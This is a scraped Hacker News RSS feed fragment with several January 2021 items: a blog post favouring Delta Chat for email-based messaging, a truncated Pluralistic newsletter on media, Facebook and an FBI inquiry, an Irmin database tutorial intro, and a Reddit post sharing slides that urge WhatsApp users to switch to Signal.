Score 20 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25796836">thread link</a>) | @type0
<br/>
January 15, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">‚úçÔ∏è Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don‚Äôt have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don‚Äôt even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>‚Äì <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn‚Äôt quite mature 2 years ago, I have to say it‚Äôs pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don‚Äôt use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796836</guid>
            <pubDate>Fri, 15 Jan 2021 21:34:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learning is a honeypot for phrenologists]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25796815">thread link</a>) | @samizdis
<br/>
January 15, 2021 | https://pluralistic.net/2021/01/15/hoover-calling/#phrenology | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/01/15/hoover-calling/#phrenology">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1764">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
phrenology, junk science, facial recognition, Michal Kosinski, disney, disneyland, disneyland at a stroll, business, annual passholders, tesla, intangibles, financialization, eff, fbi, monument toppling, streisand effect, laura poitras, first look, whistleblowers, reality winner, kickstarter, rpgs, dandd, games, sheryl sandberg, facebook, disingenuous, mexico, yugoslavia, music, old school,

Summary:
Laura Poitras fired from First Look; Kickstarting a pad of "Tiny Paper Dungeons"; Facebook says it's the best henhouse fox; I was investigated by the FBI; Yugoslavia's Cold War obsession with Mexican music; Machine learning is a honeypot for phrenologists; Disneyland kills annual passes; Tesla's valuation is 1600x its profitability

URL:
https://pluralistic.net/2021/01/15/hoover-calling/

Title:
Pluralistic: 15 Jan 2021 hoover-calling

Bullet:
üç™

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Boing Boing (https://boingboing.net), Naked Capitalism (https://www.nakedcapitalism.com/). 

--><br>
<a href="https://pluralistic.net/2021/01/15/hoover-calling/"><img src="https://i1.wp.com/craphound.com/images/15Jan2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/15Jan2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#poitras">Laura Poitras fired from First Look</a>: She says it's because she spoke out on Reality Winner.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#procedural-rpg">Kickstarting a pad of "Tiny Paper Dungeons"</a>: Procedural paper adventures for your pocket.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#hens-need-foxes">Facebook says it's the best henhouse fox</a>: Only we can stop Qanon.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#g-man">I was investigated by the FBI</a>: It took 20 years!
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#yu-mex">Yugoslavia's Cold War obsession with Mexican music</a>: Nonaligned Yumex gave us Celoveƒçernji the Kid.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#phrenology">Machine learning is a honeypot for phrenologists</a>: "AI" researchers just can't put away the fucking calipers.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#disney-dash">Disneyland kills annual passes</a>: No more Disney at a stroll.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#intangibles">Tesla's valuation is 1600x its profitability</a>: Finacialization, in green and white.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#retro">This day in history</a>: 2006, 2016, 2020
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="poitras"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Laura_Poitras_2014.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Laura_Poitras_2014.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Seven years ago, the Academy-Award-winning documentarian Laura Poitras co-founded First Look Media, and its subsidiaries/sister companies The Intercept and Field of Vision.</p>
<p>Late last year, they fired her.</p>
<p>Poitras has published a lengthy letter about her dismissal in which she says that she was fired for publicly criticizing The Intercept's handling of the Reality Winner leaks ‚Äì an incident that ended with Winner in federal prison for five years.</p>
<p><a href="https://www.praxisfilms.org/open-letter-from-laura-poitras/">https://www.praxisfilms.org/open-letter-from-laura-poitras/</a></p>
<p>The Intercept investigated its handling of the Winner leaks, and concluded that it made mistakes. But Poitras says that the internal investigation was never independent, and allowed people who were implicated in the failures to oversee the postmortem on those failures.</p>
<p>First Look says Poitras's dismissal was "natural," and the result of her "stepping away" from her duties at the company to do "her own projects."</p>
<p><a href="https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html">https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html</a></p>
<p>I have an interest here. I have sincere, deep admiration for Poitras. I contributed to the program book for her one-woman show at the Whitney, reported out a Snowden leak with her team, and one of my proudest moments was the cameo my book HOMELAND got in her doc CITIZENFOUR.</p>
<p>And I have worked with First Look; I worked for months on a video project with them, and then they optioned my novella UNAUTHORIZED BREAD. Everyone I've worked with there was bright, committed, passionate and good at their jobs.</p>
<p>Despite all that, I have no personal knowledge of any of the underlying facts.</p>
<p>Here's what I do know, though: Laura Poitras is one of the bravest, most talented filmmakers and journalists I know. She is both a good person and very good at what she does.</p>
<p>And I also know that The Intercept publishes some of the best investigative journalism today. Their work has been hugely important to me and my understanding of the world. Not a day goes by that I don't learn something profound from its work.</p>
<p>When you put those two facts together, here's what you get: profound sadness. A media entity that means a lot to me has fired one of their best journalists, who also helped found the organization. This is not a good day. Poitras's work is critical to this ghastly moment.</p>
<p>First Look is much poorer without her.</p>
<p>(<i>Image: <a href="https://commons.wikimedia.org/wiki/File:Laura_Poitras_2014.jpg">Katy Scoggin</a>, <a href="https://creativecommons.org/licenses/by/3.0/deed.en">CC BY</a></i>)</p>
<hr>
<p><a name="procedural-rpg"></a><br>
<img src="https://i0.wp.com/craphound.com/images/b62fc0f542fa242d4180c29b4533b15e_original.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/b62fc0f542fa242d4180c29b4533b15e_original.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>There came a point in my life as an RPG player where I largely stopped playing the games in favor of mostly thinking about the games, handling the materials, and reading the rulebooks.</p>
<p>The physicality of D&amp;D was always the most important part for me: the dice, the tables, the minis, the maps. I love me a D&amp;D object.</p>
<p>So I've backed "Tiny Paper Dungeons," Tom Brinton's Kickstarter campaign for a pocket-steno-pad-sized book of procedurally generated RPGs.</p>
<p><a href="https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/">https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/</a></p>
<p>Brinton's little game-book includes 50 dungeon maps that you play with a pencil and a D6, acquiring items and leveling up your stats.</p>
<p>The games are generated with Drawbot, and each pad is unique:</p>
<p><a href="https://www.drawbot.com/">https://www.drawbot.com/</a></p>
<p>The pads are printed in Utah, $5 each, for delivery in April. Brindle's done this stuff before and seems confident he can deliver (assuming covid doesn't shut down his printer).</p>
<p>As to gameplay, he says, "I'm trying to strip this genre down to its simplest form: 1 player, simple mechanics, no story-telling, just you, a die and pencil, and a series of simple decisions in the face of randomness."</p>
<p>I ordered two.</p>
<hr>
<p><a name="hens-need-foxes"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Henhouse_near_Ganthorpe_-_geograph.org.uk_-_670026.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Henhouse_near_Ganthorpe_-_geograph.org.uk_-_670026.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>A monopolist's first preference is not to be regulated.</p>
<p>A monopolist's second preference is to be regulated in a way that only it can comply with ‚Äì and that none of its competitors can comply with.</p>
<p>Oh, hai, Facebook COO Sheryl Sandberg!</p>
<p>"I think [the insurrection was] largely organized on platforms that don‚Äôt have our abilities to stop hate, and don‚Äôt have our standards, and don‚Äôt have our transparency."</p>
<p><a href="https://twitter.com/therecount/status/1348721745688211460">https://twitter.com/therecount/status/1348721745688211460</a></p>
<p>Translation: make rules that ban all the smaller platforms that compete with us, otherwise Qanon-addled musketfuckers will hogtie Congress with zip-cuffs and execute them under the Capitol Dome.</p>
<p>Even if that was true (and to be clear, <em>it is not true</em>), it would be a terrible idea.</p>
<p>But (again): <em>it's not true</em>.</p>
<p>"Facebook played a much larger role than Sandberg suggested."</p>
<p><a href="https://www.washingtonpost.com/technology/2021/01/13/facebook-role-in-capitol-protest/">https://www.washingtonpost.com/technology/2021/01/13/facebook-role-in-capitol-protest/</a></p>
<ul>
<li>128,000 people used FB discuss the rally, many planned their trip using it
</li>
<li>
<p>24+ GOP politicians used FB to organize buses to the event</p>
</li>
</ul>
<p>Oh, and despite claiming otherwise FB STILL hasn't shut down election disinformation groups:</p>
<p><a href="https://www.buzzfeednews.com/article/janelytvynenko/stop-the-steal-facebook">https://www.buzzfeednews.com/article/janelytvynenko/stop-the-steal-facebook</a></p>
<p>As Mike Masnick says: "it's just gaslighting people to pretend that Facebook has the power to moderate away all bad behavior, and even dumber to pretend that no such planning happened on your platform."</p>
<p><a href="https://www.techdirt.com/articles/20210113/17592046050/sheryl-sandberg-makes-disingenuous-push-to-argue-that-only-facebook-has-power-to-stop-bad-people-online.shtml">https://www.techdirt.com/articles/20210113/17592046050/sheryl-sandberg-makes-disingenuous-push-to-argue-that-only-facebook-has-power-to-stop-bad-people-online.shtml</a></p>
<p>Sandberg's position boils down to this: "if you're gonna get a fox to guard your henhouse, we should be that fox."</p>
<p>(<i>Image: <a href="https://commons.wikimedia.org/wiki/File:Henhouse_near_Ganthorpe_-_geograph.org.uk_-_670026.jpg">Phil Catterall</a>, <a href="https://creativecommons.org/licenses/by-sa/2.0/deed.en">CC BY-SA</a>, modified</i>)</p>
<hr>
<p><a name="g-man"></a><br>
<img src="https://i0.wp.com/craphound.com/images/shrine-greeted-by-head-g-man-j-edgar-hoover-head-of-the-department-of-justices-1024.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/shrine-greeted-by-head-g-man-j-edgar-hoover-head-of-the-department-of-justices-1024.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Yesterday was my 20th blogging anniversary. I admit that it carried more emotional freight than I expected. 20 years is a long time to do anything, let alone something that's so personal and yet so public.</p>
<p><a href="https://pluralistic.net/2021/01/13/two-decades/#hfbd">https://pluralistic.net/2021/01/13/two-decades/#hfbd</a></p>
<p>As it happens, an anonymous reader gave me a hell of a blogiversary gift: my first-ever FBI investigation! I've spoken to FBI agents before (Agent: Does your Tor exit node keep logs by any chance? Me: Nope. Agent: Dang), but I've never actually been <em>investigated</em>.</p>
<p>My phone rang with an unfamiliar local number. A calm voice on the other end introduced itself as an FBI special agent with the LA office. I pointed out that this was an unlikely claim and asked for a switchboard number I could call back on.</p>
<p>The agent said this was an entirely reasonable thing to do. A few minutes later, I was back on the phone with him.</p>
<p>Me: What can I do for you?</p>
<p>Him: I'm calling about a blog post you published. I'm sure you know which.</p>
<p>Me: Uh, no.</p>
<p>Him: The one about toppling statues.</p>
<p>He meant this post:</p>
<p><a href="https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage">https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage</a></p>
<p>tldr: it's a link to a Popular Mechanics article on the science of toppling monuments, with a brief intro and summary.</p>
<p>There's nothing illegal in that post, but also you should never talk to cops without a lawyer, so I asked him if he minded my setting up a time to make that happen. He said that was fine with him.</p>
<p>My EFF colleague Mark Rumold was kind enough to volunteer to call the special agent. He reported back shortly thereafter to say that the agent was responding to a complaint, and that he agreed my post was not unlawful in any way.</p>
<p>Mark confirmed for the agent that I was not planning any unlawful activity, and the agent asked him to remind me that people can misinterpret the things we publish on the internet.</p>
<p>That was it.</p>
<p>It was an anticlimax, sure. I confess that I was a little freaked out. It was just the anniversary of Aaron Swartz's death, and my mind kept going back to his account of the time the FBI showed up to ask him about PACER, and the horrors that followed.</p>
<p>But it's over. The agent, to his credit, was pleasant and reasonable. But I'm mystified by the complaint ‚Äì my guess is some troll has figured out that you can sic the FBI on people you disagree with on the internet ‚Äì and even more by the fact that the FBI acted on it.</p>
<p>They must have the discretion to decide when a complaint rises to the level of using a special agent's time and when it should go in the kook folder. Seems to me that filing complaints about my post in the kook folder should have been a no-brainer.</p>
<p>I'm looking into using FOIA and the 1974 Privacy Act to find out what kind of file this generated, and to have that record expunged.</p>
<p><a href="https://www.eff.org/deeplinks/2019/09/victory-individuals-can-force-government-purge-records-their-first-amendment">https://www.eff.org/deeplinks/2019/09/victory-individuals-can-force-government-purge-records-their-first-amendment</a></p>
<p>In the meantime, I'm declaring a federal criminal investigation to be the Official 20th Blogiversary gift.</p>
<hr>
<p><a name="yu-mex"></a><br>
<img src="https://i0.wp.com/craphound.com/images/yugoslav-mexican-parodies.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/yugoslav-mexican-parodies.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>The Cold War is memorialized as a moment in which the world split into two: the east and west, the Warsaw Pact and NATO. But a sizeable number of countries sat out the Cold War, and many of them formed a third bloc called the "nonaligned countries."</p>
<p>The nonaligned movement's founding member was Yugoslavia, and it became a socialist republic on the USSR's doorstep that had a simmering (and at times openly) hostile relationship with its vast neighbor.</p>
<p>This betwixt/between posture left Yugoslavia cut off from both Hollywood movies and Soviet cinema: naturally, they turned to the Mexican film industry.</p>
<p>The 1950s and 60s were the Yu-Mex moment, when the nation thrilled to imported Mexican movies that glorified the Mexican revolution. On Global Voices, Filip Stojanovski tells the story of a quarter century of Yugoslavian ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/01/15/hoover-calling/#phrenology">https://pluralistic.net/2021/01/15/hoover-calling/#phrenology</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/01/15/hoover-calling/#phrenology</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796815</guid>
            <pubDate>Fri, 15 Jan 2021 21:32:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Irmin ‚Äì A distributed database built on the same principles as Git]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25796563">thread link</a>) | @stunt
<br/>
January 15, 2021 | https://irmin.org/tutorial/introduction | <a href="https://web.archive.org/web/*/https://irmin.org/tutorial/introduction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/mirage/irmin">Irmin</a> is a key-value store based on the same principles as Git. This means
that for existing Git users it provides many familiar features:
branching/merging, history and the ability to restore to any previous state.</p>
<p>Typically Irmin is accessed by embedding it into an OCaml application, but can
also be accessed using HTTP using <code>irmin-http</code> or GraphQL using <code>irmin-graphql</code>.
It is most often used to store application data, like configuration values,
shared state or checkpoint data, but there is nothing stopping you from using it
as a general purpose key-value store too. Additionally, since it is compatible
with Git, Irmin can be used to interact with Git repositories directly from
within your application.</p>
<p>Take a moment to skim the <a href="https://github.com/mirage/irmin/blob/master/README.md">README</a> to familiarize yourself with
some of the concepts. Also, if you find that anything is missing or unclear in
this tutorial then please file <a href="https://github.com/mirage/irmin.org/issues">an issue</a>!</p>
<!-- prettier-ignore-start -->
<!-- prettier-ignore-end --></div></div>]]>
            </description>
            <link>https://irmin.org/tutorial/introduction</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796563</guid>
            <pubDate>Fri, 15 Jan 2021 21:12:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhatsApp Status to convince your family and friends to switch to Signal]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25796535">thread link</a>) | @karlzt
<br/>
January 15, 2021 | https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/ | <a href="https://web.archive.org/web/*/https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- SC_OFF --><div><p><strong>**UPDATE: Ready to use after WA announced T&amp;C delay! New languages: Slovak, Czech, Portuguese (PT), Finnish, Turkish, Hindi, Spanish, Portuguese (BR), Italian, French, Dutch - more coming soon*\</strong>*</p>

<blockquote>
<p>Hey there, I'm using Signal!</p>
</blockquote>

<p>When people switch to Signal they often have the problem to convince all their contacts from WhatsApp to do the same. I had that struggle too.</p>

<p>That's why I created something to put into my WhatsApp Status: around 20 slides explaining why to switch and why I am going to delete WhatsApp. I think it's better to be educational than pushy or insulting to get people to switch, so I tried it this way and successfully got my family and friends to switch to Signal.</p>

<p>Now I decided to share the slides with you and hope they help you too!</p>



<p>There are 2 versions for each language: One including a comment about GDPR (for EU citizens) and one that does not mention anything about GDPR (rest of world).</p>

<p>F<em>or UK users:</em> <a href="https://teddit.net/u/Winnie_the_Pooch">u/Winnie_the_Pooch</a> <em>commented: "[...] use the EU version. Even though we√¢‚Ç¨‚Ñ¢ve now left, the EU GDPR has (thankfully!) been enshrined in British law as the</em> <a href="https://ico.org.uk/for-organisations/dp-at-the-end-of-the-transition-period/data-protection-now-the-transition-period-has-ended/the-gdpr/"><em>UK GDPR</em></a> <em>[...]". Lucky you!</em></p>



<p>WhatsApp delays their privacy policy update to <strong>mid of may</strong>!</p>

<p><strong>But this does not change the facts mentioned in the slides about metadata etc.!</strong> So, why should you wait until may? On the other hand, you now have more time to convince your contacts to switch!</p>

<p><strong>UPDATE:</strong> I updated each version like the following:</p>

<ul>
<li>The first slide does not have a headline anymore. You can add your own text here using the editing options in WhatsApp (its the T on the top right) or your favorite graphic editing software. Write something along the line as "I will delete WhatsApp on [insert date here]" or similar.</li>
<li>I replaced the last two chat messages on slide 03 with the text from slide 04. Total amount of slides reduced to 19!</li>
</ul>

<p><strong>Before sharing your new WhatsApp Status check if the Signal service is currently up and running:</strong> <a href="https://status.signal.org/">status.signal.org</a> (if it is down you should wait, as your contacts may not be able to register!)</p>



<p>‚Äã</p>

<p><strong>Thanks to all translators!</strong></p>

<table><thead>
<tr>
<th></th>
<th><strong>GDPR (for EU citizens)</strong></th>
<th><strong>No GDPR (rest of world)</strong></th>
</tr>
</thead><tbody>
<tr>
<td><strong>English</strong></td>
<td><a href="http://imgbox.com/g/wWfXnKIv9T">images</a> - <a href="https://filehorst.de/d/dsIzayIF">zip file</a></td>
<td><a href="https://imgbox.com/g/bu1G1Nnz8s">images</a> - <a href="https://filehorst.de/d/dxvCmdfH">zip file</a></td>
</tr>
<tr>
<td><strong>German</strong></td>
<td><a href="https://imgbox.com/g/6cGzvJ7JbQ">images</a> - <a href="https://filehorst.de/d/dtaAcwlv">zip file</a></td>
<td><a href="https://imgbox.com/g/KbIM7RBmAb">images</a> - <a href="https://filehorst.de/d/dtwhadvs">zip file</a></td>
</tr>
<tr>
<td><strong>Dutch</strong></td>
<td><a href="http://imgbox.com/g/KZzkrjNlRF">images</a> - <a href="https://filehorst.de/d/dhiGelei">zip file</a></td>
<td><a href="http://imgbox.com/g/no5XE3rLKf">images</a> - <a href="https://filehorst.de/d/dlHoIBJt">zip file</a></td>
</tr>
<tr>
<td><strong>Spanish</strong></td>
<td><a href="http://imgbox.com/g/jDX4co55Vc">images</a> - <a href="https://filehorst.de/d/dcjeAeEt">zip file</a></td>
<td><a href="http://imgbox.com/g/Pc0EkJ9qWh">images</a> - <a href="https://filehorst.de/d/dniedoph">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (PT)</strong></td>
<td><a href="http://imgbox.com/g/2MHxmi4VFS">images</a> - <a href="https://filehorst.de/d/dCprbnrk">zip file</a></td>
<td><a href="http://imgbox.com/g/DaPhzju7Ht">images</a> - <a href="https://filehorst.de/d/dbAHawjy">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (BR)</strong></td>
<td><a href="http://imgbox.com/g/Qj5taiuaL4">images</a> - <a href="https://filehorst.de/d/dIikBxhn">zip file</a></td>
<td><a href="http://imgbox.com/g/9WBMHYKcwA">images</a> - <a href="https://filehorst.de/d/dfxHgAay">zip file</a></td>
</tr>
<tr>
<td><strong>French</strong></td>
<td><a href="http://imgbox.com/g/5Po0sskqve">images</a> - <a href="https://filehorst.de/d/dAmaJgmw">zip file</a></td>
<td><a href="https://imgbox.com/g/hOwDOt4ORM">images</a> - <a href="https://filehorst.de/d/dkiwkiJw">zip file</a></td>
</tr>
<tr>
<td><strong>Czech</strong></td>
<td><a href="http://imgbox.com/g/BPWPrHxNCA">images</a> - <a href="https://filehorst.de/d/dgEajusf">zip file</a></td>
<td><a href="http://imgbox.com/g/7ThzK6HMyH">images</a> - <a href="https://filehorst.de/d/dinpsFvk">zip file</a></td>
</tr>
<tr>
<td><strong>Italian</strong></td>
<td><a href="http://imgbox.com/g/gT3KmJN3z7">images</a> - <a href="https://filehorst.de/d/dBIfvBvp">zip file</a></td>
<td><a href="http://imgbox.com/g/FT9Z1ROxFO">images</a> - <a href="https://filehorst.de/d/dIdfJagg">zip file</a></td>
</tr>
<tr>
<td><strong>Hindi</strong></td>
<td>please send translation for GDPR part (slide 12)</td>
<td><a href="http://imgbox.com/g/kJg7fHBEjK">images</a> - <a href="https://filehorst.de/d/drszqqzj">zip file</a></td>
</tr>
<tr>
<td><strong>Turkish</strong></td>
<td><a href="http://imgbox.com/g/U3rN7N2pUO">images</a> - <a href="https://filehorst.de/d/dnmqvpEx">zip file</a></td>
<td><a href="http://imgbox.com/g/60YM7Y9K8Q">images</a> - <a href="https://filehorst.de/d/dcyjAfcb">zip file</a></td>
</tr>
<tr>
<td><strong>Polish</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Arabic</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Cantonese</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Finnish</strong></td>
<td><a href="http://imgbox.com/g/7XuhMwwKNU">images</a> - <a href="https://filehorst.de/d/dwymzjaJ">zip file</a></td>
<td><a href="http://imgbox.com/g/yAM6M5vklE">images</a> - <a href="https://filehorst.de/d/dhzrICHj">zip file</a></td>
</tr>
<tr>
<td><strong>Slovak</strong></td>
<td><a href="http://imgbox.com/g/UhzDU5wtuB">images</a> - <a href="https://filehorst.de/d/ddrHhsqh">zip file</a></td>
<td><a href="http://imgbox.com/g/iMIU4IPQJd">images</a> - <a href="https://filehorst.de/d/dweGmCEB">zip file</a></td>
</tr>
</tbody></table>

<p><strong>How to contribute</strong></p>

<p><em>Coming soon</em> means you don't have to send me translations for this language anymore, I just need to add them. Please be patient.</p>

<p>If you like to have the status in your language too: <a href="https://pastebin.com/Fc9Xcadi">here is the raw text</a> (try to not change the formatting please). Please translate only into languages you are fluent in.</p>

<p>!Please also provide a screenshot of the "New privacy policy" message  in your language for the 2nd slide. Search the web if needed!</p>



<p>Please look into related subreddits to get familiar with the topic:</p>

<ul>
<li><a href="https://teddit.net/r/signal">r/signal</a></li>
<li><a href="https://teddit.net/r/whatsapp">r/whatsapp</a></li>
<li><a href="https://teddit.net/r/privacy">r/privacy</a></li>
<li><a href="https://teddit.net/r/privacytoolsIO">r/privacytoolsIO</a></li>
</ul>

<p><strong>How to add WhatsApp Status in the correct order</strong></p>

<ol>
<li>First, take a look in your WhatsApp Status privacy settings and make sure to select all the contacts you want to see your new status.</li>
<li>Open the gallery app.</li>
<li>Select all images, starting from the first slide (1-19).</li>
<li>Press share.</li>
<li>Select WhatsApp.</li>
<li>Select "My Status" &amp; make sure the slides are in the correct order.</li>
<li>Add your custom intro text on slide 01.</li>
<li>Send. Done.</li>
</ol>

<p><strong>Best practices</strong></p>

<p>Think about what time is best to post your status. Think about what your contacts are probably doing at the moment. They might not want to read 20 slides of text while they are at work.</p>

<p>At last position in your story I recommend the video from <a href="https://teddit.net/r/signal/comments/kv54u7/best_signal_video_for_your_whatsapp_status/">this post</a> (credits to <a href="https://teddit.net/u/carlosfx">u/carlosfx</a> !).</p>

<p>Signal published a <a href="https://twitter.com/signalapp/status/1349236175773462532">replacement for your profile pic</a> on their twitter account.</p>

<p><a href="https://teddit.net/u/Xath0n">u/Xath0n</a> suggested to put a text status with a direct link to <a href="https://signal.org/downloads">signal.org/downloads</a> at the end, so people don't need to search for it (Signal is in the top charts in the app stores currently, so it shouldn't be too hard to find anyway).</p>

<p>You can also thank everyone for watching your TED talk, lol.</p>

<p>If you think most of your contacts don't look into WhatsApp Status you can do the following:</p>

<ul>
<li>let them know that you want them to look into your WA Status, because it's important to you</li>
<li>send the slides to your contacts directly or in a group chat</li>
<li>send them the link to the images (note that the mobile view of imgbox is not the best)</li>
</ul>



<ul>
<li>I know that 19+ slides are a lot for a single WhatsApp Status and people might not read it <strong>but it is worth a try.</strong></li>
<li>It is intentionally written in simple terms to be understood by people who are not as tech savvy as you are.</li>
<li>Be prepared for questions, arguments, debates and to provide evidence of what your new status is saying (look up this subreddit for more info). Make sure you know the facts!</li>
<li>The style of the content may not appeal to everyone in your contact list.</li>
<li>Remember that some of your contacts don't look at WA Status at all.</li>
</ul>



<p><strong>Animated Status</strong> (old date)</p>

